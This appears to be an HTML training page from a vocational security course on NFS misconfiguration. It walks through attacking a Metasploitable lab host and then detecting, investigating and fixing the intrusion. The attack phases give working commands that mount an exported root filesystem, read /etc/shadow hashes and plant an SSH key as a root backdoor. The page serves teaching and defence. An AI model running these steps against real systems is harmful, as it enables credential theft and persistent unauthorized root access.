@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="ko" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>실습 11: NFS 보안 아키텍처 및 침투 사고 분석</title>
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background-color: #020617; 
+            color: #f8fafc; 
+            margin: 0; padding: 0;
+            line-height: 1.8;
+        }
+        .terminal-bg { background-color: #020617; border: 1px solid #1e293b; }
+        .text-glow { text-shadow: 0 0 10px rgba(34, 211, 238, 0.4); }
+        .section-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(51, 65, 85, 0.5); backdrop-filter: blur(12px); }
+        .code-block { font-family: 'Fira Code', monospace; }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
+        .comment { color: #64748b; font-style: italic; }
+        .output-line { color: #94a3b8; }
+        .highlight { color: #22d3ee; font-weight: bold; }
+        .warning { color: #f87171; font-weight: bold; }
+        .success { color: #34d399; font-weight: bold; }
+    </style>
+</head>
+<body class="antialiased pb-20">
+
+    <!-- Header -->
+    <header class="border-b border-slate-800 bg-slate-900/50 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto px-6 py-8 flex justify-between items-center">
+            <div>
+                <div class="flex items-center gap-2 mb-2">
+                    <span class="bg-cyan-500 text-slate-900 px-2 py-0.5 text-[10px] font-black uppercase tracking-widest rounded-sm shadow-[0_0_10px_rgba(34,211,238,0.5)]">Cyber Security Lab</span>
+                    <span class="text-slate-500 font-mono text-[10px]">SEC-P-11 | INFRASTRUCTURE SECURITY</span>
+                </div>
+                <h1 class="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-indigo-500 tracking-tight leading-tight">
+                    NFS 아키텍처 취약점 및 침해 사고 대응<br><span class="text-slate-100 text-2xl">Penetration, Detection, Forensics, and Hardening</span>
+                </h1>
+            </div>
+            <div class="text-right hidden md:block border-l border-slate-800 pl-6">
+                <div class="bg-red-500/10 text-red-400 border border-red-500/20 px-4 py-2 rounded-xl text-sm font-black font-mono shadow-lg">
+                    CORE: 11.0.1
+                </div>
+                <p class="text-[10px] text-slate-500 mt-2 tracking-widest uppercase">Lead System Architect</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-16 space-y-24">
+
+        <!-- PART 1: 기초 이론 및 아키텍처 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
+                1. NFS 아키텍처 및 보안 매커니즘 개요 (Architecture Overview)
+            </h2>
+            <div class="section-card rounded-3xl p-10 shadow-2xl">
+                <div class="prose prose-invert max-w-none mb-10 text-slate-300">
+                    <p>
+                        <span class="font-bold text-cyan-400">NFS(Network File System, 네트워크 파일 시스템)</span>는 Sun Microsystems가 개발한 분산 파일 시스템 프로토콜로, 네트워크상의 다른 컴퓨터에 있는 파일을 마치 로컬 디스크에 있는 것처럼 사용할 수 있게 해줍니다. 하지만 전통적인 NFS(v2, v3)는 보안보다는 <span class="highlight">성능과 편의성</span>에 초점이 맞춰져 설계되었습니다.
+                    </p>
+                    <p>
+                        침투의 핵심 동인은 <span class="font-bold text-red-400">RPC(Remote Procedure Call, 원격 프로시저 호출)</span> 서비스의 정보 노출과 <span class="font-bold text-red-400">/etc/exports</span> 설정 파일의 미흡한 접근 제어입니다. 특히, 클라이언트의 루트 권한을 서버에서도 그대로 인정해버리는 <span class="highlight">no_root_squash</span> 옵션은 원격 시스템의 완전한 장악을 가능하게 하는 치명적인 구멍입니다.
+                    </p>
+                </div>
+
+                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-inner">
+                    <h4 class="text-center font-bold text-slate-400 mb-8 text-xs tracking-widest uppercase">
+                        [도식: NFS 침투 및 탐지 논리 프로세스]
+                    </h4>
+                    <div class="flex flex-col md:flex-row items-center justify-between gap-6">
+                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-cyan-900/50 shadow-lg">
+                            <i data-lucide="shield-alert" class="w-10 h-10 text-cyan-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">공격자 (Attacker)</div>
+                            <div class="text-[10px] text-slate-500 mt-1 italic">Kali Linux (192.168.10.10)</div>
+                        </div>
+                        <div class="flex flex-col items-center">
+                            <i data-lucide="zap" class="w-6 h-6 text-yellow-500 mb-2"></i>
+                            <div class="w-24 h-0.5 bg-slate-700"></div>
+                        </div>
+                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-blue-900/50 shadow-lg">
+                            <i data-lucide="server" class="w-10 h-10 text-blue-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">타겟 (Target)</div>
+                            <div class="text-[10px] text-slate-500 mt-1 italic">Metasploitable (192.168.10.50)</div>
+                        </div>
+                        <div class="flex flex-col items-center">
+                            <i data-lucide="search" class="w-6 h-6 text-green-500 mb-2"></i>
+                            <div class="w-24 h-0.5 bg-slate-700"></div>
+                        </div>
+                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-amber-900/50 shadow-lg">
+                            <i data-lucide="database" class="w-10 h-10 text-amber-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">로그/분석 (Forensics)</div>
+                            <div class="text-[10px] text-slate-500 mt-1 italic">syslog, auth.log, nfsd</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PART 2: 침투 실습 (공격자 관점) -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-red-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
+                2. 실전 침투 시나리오 (Penetration Scenario)
+            </h2>
+            <div class="section-card rounded-3xl p-10 shadow-2xl space-y-12">
+                
+                <!-- Reconnaissance -->
+                <div class="space-y-6">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-red-500 text-slate-900 px-3 py-1 rounded-full text-xs font-black">PHASE 01</span>
+                        <h3 class="text-xl font-bold text-slate-100 underline decoration-red-500 underline-offset-8">정보 수집 및 서비스 열거 (Enumeration)</h3>
+                    </div>
+                    <div class="pl-6 space-y-4">
+                        <p class="text-slate-400 text-sm">타겟 시스템(192.168.10.50)에서 구동 중인 NFS 서비스의 상세 정보를 확인합니다.</p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Kali Linux Console</div>
+                            <div class="text-slate-200"># 1. Nmap을 이용한 포트 스캔 (111: RPCBind, 2049: NFS)</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">nmap -p 111,2049 192.168.10.50</span></div>
+                            <div class="output-line">PORT     STATE SERVICE</div>
+                            <div class="output-line">111/tcp  <span class="success">open</span>  rpcbind <span class="comment"># RPC 프로그램 번호를 포트 번호로 변환해주는 서비스</span></div>
+                            <div class="output-line">2049/tcp <span class="success">open</span>  nfs     <span class="comment"># 실제 NFS 데이터 통신 포트</span></div>
+                            <br>
+                            <div class="text-slate-200"># 2. rpcinfo를 통한 서비스 상세 리스트 추출</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">rpcinfo -p 192.168.10.50</span></div>
+                            <div class="output-line">   program vers proto   port  service</div>
+                            <div class="output-line">    100000    2   tcp    111  portmapper <span class="comment"># RPC 서비스 관리자</span></div>
+                            <div class="output-line">    100003    2   tcp   2049  nfs        <span class="comment"># NFS 버전 2</span></div>
+                            <div class="output-line">    100003    3   tcp   2049  nfs        <span class="comment"># NFS 버전 3 (상대적으로 취약함)</span></div>
+                            <div class="output-line">    100005    1   udp  34561  mountd     <span class="comment"># 마운트 요청 처리 데몬</span></div>
+                            <br>
+                            <div class="text-slate-200"># 3. 공유 가능한 디렉터리(Exports) 확인</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">showmount -e 192.168.10.50</span></div>
+                            <div class="output-line">Export list for 192.168.10.50:</div>
+                            <div class="output-line"><span class="warning">/</span> * <span class="comment"># 치명적 결함: 루트(/) 디렉터리가 모든 호스트(*)에 공개됨</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Exploitation -->
+                <div class="space-y-6">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-red-500 text-slate-900 px-3 py-1 rounded-full text-xs font-black">PHASE 02</span>
+                        <h3 class="text-xl font-bold text-slate-100 underline decoration-red-500 underline-offset-8">공격적 마운트 및 데이터 탈취 (Exploitation)</h3>
+                    </div>
+                    <div class="pl-6 space-y-4">
+                        <p class="text-slate-400 text-sm">원격 시스템의 루트 권한 파일을 탈취하기 위해 마운트를 수행합니다.</p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="text-slate-200"># 1. 로컬에 빈 디렉터리 생성</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">sudo mkdir -p /mnt/meta_root</span></div>
+                            <br>
+                            <div class="text-slate-200"># 2. NFS 마운트 실행 (옵션 설명: nfsvers=3 - v3 사용, nolock - 파일 잠금 무시)</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">sudo mount -t nfs -o nfsvers=3,nolock 192.168.10.50:/ /mnt/meta_root</span></div>
+                            <br>
+                            <div class="text-slate-200"># 3. 권한 확인 및 민감 정보 접근</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">ls -ld /mnt/meta_root/root</span></div>
+                            <div class="output-line">drwx------ 4 root root 4096 May 20 09:12 /mnt/meta_root/root <span class="comment"># 마운트된 곳의 root 폴더가 보임</span></div>
+                            <br>
+                            <div class="text-slate-200"># 4. 해시(Hash) 탈취</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">sudo cat /mnt/meta_root/etc/shadow | head -n 3</span></div>
+                            <div class="output-line">root:$1$LgfW$G/V..:14681:0:99999:7::: <span class="comment"># 루트 패스워드 해시값 획득</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Persistence -->
+                <div class="space-y-6">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-red-500 text-slate-900 px-3 py-1 rounded-full text-xs font-black">PHASE 03</span>
+                        <h3 class="text-xl font-bold text-slate-100 underline decoration-red-500 underline-offset-8">영구적 권한 확보 (Persistence)</h3>
+                    </div>
+                    <div class="pl-6 space-y-4">
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="text-slate-200"># SSH 공개키 삽입 (백도어 형성)</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">mkdir -p /mnt/meta_root/root/.ssh</span> <span class="comment"># 원격지에 .ssh 폴더 생성</span></div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">cat ~/.ssh/id_rsa.pub >> /mnt/meta_root/root/.ssh/authorized_keys</span> <span class="comment"># 내 공개키 삽입</span></div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">chmod 600 /mnt/meta_root/root/.ssh/authorized_keys</span> <span class="comment"># 권한 조정</span></div>
+                            <br>
+                            <div class="text-slate-200"># 이제 마운트를 끊어도 SSH로 루트 접속이 가능함</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">ssh root@192.168.10.50</span></div>
+                            <div class="output-line success">root@metasploitable:~# <span class="comment"># 암호 입력 없이 루트 쉘 즉시 획득</span></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PART 3: 탐지 및 사고 분석 (방어자 관점) -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-amber-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
+                3. 침해 탐지 및 사고 분석 명세 (Detection & Forensics)
+            </h2>
+            <div class="section-card rounded-3xl p-10 shadow-2xl space-y-12">
+                
+                <!-- Real-time Detection -->
+                <div class="space-y-6">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-amber-500 text-slate-900 px-3 py-1 rounded-full text-xs font-black">ACTION 01</span>
+                        <h3 class="text-xl font-bold text-slate-100">실시간 로그 모니터링 (Live Monitoring)</h3>
+                    </div>
+                    <p class="text-slate-300 text-sm">서버 관리자는 공격이 진행되는 동안 다음과 같은 로그를 실시간으로 확인하여 즉각 대응해야 합니다.</p>
+                    <div class="pl-6 space-y-4">
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Metasploitable Console</div>
+                            <div class="text-slate-200"># 1. 시스템 로그를 통한 마운트 시도 감시</div>
+                            <div class="text-slate-200">$ <span class="text-amber-400">tail -f /var/log/syslog | grep mountd</span></div>
+                            <div class="output-line mt-2">rpc.mountd[1234]: <span class="warning">authenticated mount request</span> from 192.168.10.10:987 for / (rootid 0)</div>
+                            <div class="comment mt-1">// 실시간 알림: IP 192.168.10.10에서 루트(/) 경로에 마운트를 시도하고 성공함</div>
+                            <br>
+                            <div class="text-slate-200"># 2. 현재 열려 있는 네트워크 세션 확인</div>
+                            <div class="text-slate-200">$ <span class="text-amber-400">netstat -an | grep 2049</span></div>
+                            <div class="output-line">tcp   0   0 0.0.0.0:2049     0.0.0.0:* LISTEN <span class="comment"># 서버가 열려 있음</span></div>
+                            <div class="output-line">tcp   0   0 192.168.10.50:2049   192.168.10.10:765   <span class="warning">ESTABLISHED</span> <span class="comment"># 공격자와 연결 상태!</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Forensic Investigation -->
+                <div class="space-y-6">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-amber-500 text-slate-900 px-3 py-1 rounded-full text-xs font-black">ACTION 02</span>
+                        <h3 class="text-xl font-bold text-slate-100">공격 후 로그 분석 (Forensic Investigation)</h3>
+                    </div>
+                    <div class="pl-6 space-y-6">
+                        <div class="bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
+                            <h4 class="font-bold text-slate-100 mb-4 flex items-center gap-2"><i data-lucide="file-search-2" class="w-5 h-5"></i> 1단계: 마운트 기록 전수 조사</h4>
+                            <p class="text-xs text-slate-400 mb-4">공격이 언제 시작되었고 어느 IP에서 들어왔는지 타임라인을 구성합니다.</p>
+                            <div class="terminal-bg rounded-xl p-4 font-mono text-xs">
+                                <span class="text-amber-400">grep "mountd" /var/log/syslog.1</span><br>
+                                <span class="output-line">May 20 10:05:22 metasploit rpc.mountd: authenticated mount request from 192.168.10.10 for /</span>
+                            </div>
+                        </div>
+
+                        <div class="bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
+                            <h4 class="font-bold text-slate-100 mb-4 flex items-center gap-2"><i data-lucide="user-plus" class="w-5 h-5"></i> 2단계: 백도어 흔적 발견 (Forensic Trace)</h4>
+                            <p class="text-xs text-slate-400 mb-4">루트 계정에 인가되지 않은 SSH 키가 삽입되었는지 확인합니다.</p>
+                            <div class="terminal-bg rounded-xl p-4 font-mono text-xs">
+                                <span class="text-amber-400">ls -la /root/.ssh/authorized_keys</span><br>
+                                <span class="output-line">-rw------- 1 root root 400 May 20 10:15 /root/.ssh/authorized_keys</span><br>
+                                <span class="text-amber-400">cat /root/.ssh/authorized_keys</span><br>
+                                <span class="output-line">ssh-rsa AAAAB3NzaC1... <span class="warning">kali@kali-linux</span></span> <span class="comment"># 공격자의 호스트네임 발견!</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PART 4: 보안 조치 및 현대적 고찰 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-green-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
+                4. 대응 조치 및 현대적 보안 (Remediation & Modern View)
+            </h2>
+            <div class="section-card rounded-3xl p-10 shadow-2xl space-y-12">
+                
+                <!-- Immediate Actions -->
+                <div class="space-y-6">
+                    <h3 class="text-xl font-bold text-slate-100 flex items-center gap-3">
+                        <i data-lucide="shield-check" class="w-6 h-6 text-green-400"></i> 즉각적 보안 조치 (Emergency Fix)
+                    </h3>
+                    <div class="pl-6 space-y-4">
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="comment"># 1. 모든 공유 강제 종료</div>
+                            <div class="text-slate-200">$ <span class="text-green-400">sudo exportfs -au</span></div>
+                            <br>
+                            <div class="comment"># 2. 취약한 설정 파일 전면 수정 (/etc/exports)</div>
+                            <div class="text-slate-200">$ <span class="text-green-400">sudo vi /etc/exports</span></div>
+                            <div class="bg-slate-800 p-2 rounded mt-2">
+                                <span class="text-red-400">- / * (rw, sync, no_root_squash)</span> <span class="comment"># 삭제 대상</span><br>
+                                <span class="text-green-400">+ /data 192.168.10.100(rw, sync, root_squash)</span> <span class="comment"># 특정 IP 한정, root 매핑 강제</span>
+                            </div>
+                            <br>
+                            <div class="comment"># 3. 변경 사항 재적용</div>
+                            <div class="text-slate-200">$ <span class="text-green-400">sudo exportfs -av</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Modern NFS Comparison -->
+                <div class="space-y-8">
+                    <h3 class="text-xl font-bold text-slate-100">최신 NFSv4 서버와의 비교 분석</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <div class="p-6 bg-slate-800/50 border border-slate-700 rounded-2xl">
+                            <h4 class="font-bold text-cyan-400 mb-4">전통적 NFS (v2, v3)</h4>
+                            <ul class="text-xs text-slate-400 space-y-3">
+                                <li class="flex items-start gap-2"><i data-lucide="x-circle" class="w-4 h-4 text-red-500"></i> 포트가 분산됨 (111, 2049, 랜덤 포트)</li>
+                                <li class="flex items-start gap-2"><i data-lucide="x-circle" class="w-4 h-4 text-red-500"></i> IP 기반의 단순 인증 (Spoofing에 취약)</li>
+                                <li class="flex items-start gap-2"><i data-lucide="x-circle" class="w-4 h-4 text-red-500"></i> 보안 옵션이 기본적으로 비활성화</li>
+                            </ul>
+                        </div>
+                        <div class="p-6 bg-slate-800/50 border border-slate-700 rounded-2xl">
+                            <h4 class="font-bold text-green-400 mb-4">최신 NFS (v4.x)</h4>
+                            <ul class="text-xs text-slate-400 space-y-3">
+                                <li class="flex items-start gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> 2049 포트 하나만 사용 (방화벽 친화적)</li>
+                                <li class="flex items-start gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> Kerberos 기반의 강력한 인증 지원</li>
+                                <li class="flex items-start gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> 가상 루트(Pseudo Root)를 통한 시스템 격리</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="prose prose-invert max-w-none text-sm text-slate-400 leading-relaxed bg-blue-900/10 p-6 rounded-2xl border border-blue-900/30">
+                        <h4 class="text-blue-100 font-black">침투 가능성 판정 (Modern Verdict)</h4>
+                        <p>
+                            최신 Ubuntu나 RHEL 서버에서 같은 코드로 마운트를 시도하면, 기본적으로 <span class="text-red-400 underline decoration-red-400 underline-offset-4">Refused</span> 오류가 발생합니다. 현대적인 서버는 <span class="highlight">root_squash</span>가 기본값이며, NFSv4 엔진은 클라이언트의 UID/GID를 서버의 이름 공간과 철저히 격리(ID Mapping)하기 때문입니다. 따라서 v4 환경에서는 Kerberos 티켓을 탈취하지 않는 이상 위와 같은 고전적 침투는 불가능에 가깝습니다.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PART 5: 모의해킹 보고서 작성 가이드 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-indigo-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
+                5. 모의해킹 결과 보고서 작성 (Report Strategy)
+            </h2>
+            <div class="section-card rounded-3xl p-10 shadow-2xl space-y-8">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                    <div class="space-y-4">
+                        <h4 class="font-bold text-slate-100 flex items-center gap-2"><i data-lucide="terminal" class="w-5 h-5 text-indigo-400"></i> Kali 서버에서 수집할 증적</h4>
+                        <ul class="list-decimal ml-6 text-sm text-slate-400 space-y-2">
+                            <li><span class="text-indigo-400 font-bold">showmount -e 192.168.10.50</span> 화면 스크린샷</li>
+                            <li><span class="text-indigo-400 font-bold">ls -l /mnt/meta_root/etc/shadow</span> 명령의 출력값</li>
+                            <li>공격자 PC에서 생성한 SSH 공개키 정보 (<span class="font-mono">id_rsa.pub</span>)</li>
+                        </ul>
+                    </div>
+                    <div class="space-y-4">
+                        <h4 class="font-bold text-slate-100 flex items-center gap-2"><i data-lucide="shield" class="w-5 h-5 text-amber-400"></i> Meta 서버에서 수집할 증적</h4>
+                        <ul class="list-decimal ml-6 text-sm text-slate-400 space-y-2">
+                            <li><span class="text-amber-400 font-bold">grep "mount request" /var/log/syslog</span> 로그 내역</li>
+                            <li>수정 전 <span class="text-amber-400 font-bold">/etc/exports</span> 파일의 내용</li>
+                            <li><span class="text-amber-400 font-bold">last</span> 명령어를 통한 root 계정 로그인 이력</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="bg-indigo-900/10 p-6 rounded-2xl border border-indigo-900/30">
+                    <h4 class="text-indigo-200 font-black mb-2 uppercase text-xs">Architect's Note</h4>
+                    <p class="text-xs text-slate-500 italic">
+                        "진정한 전문가는 공격에 성공한 것을 자랑하는 사람이 아니라, 그 공격이 가능했던 근본 원인(Root Cause)을 정확히 짚어내고 비즈니스 연속성을 보장할 수 있는 최적의 방어 아키텍처를 제시하는 사람입니다. 보고서에는 반드시 '취약점의 위협 수준'과 '조치 우선순위'를 포함하십시오."
+                    </p>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="max-w-6xl mx-auto px-6 py-12 border-t border-slate-800 text-center">
+        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
+            © 2026 IP Vocational Training Center - Senior Security Architect Edition
+        </div>
+        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto italic">
+            본 문서는 공식 보안 교육 자료로, 허가되지 않은 시스템에 대한 실습은 법적 책임을 수반할 수 있습니다.
+        </p>
+    </footer>
+
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+</html>
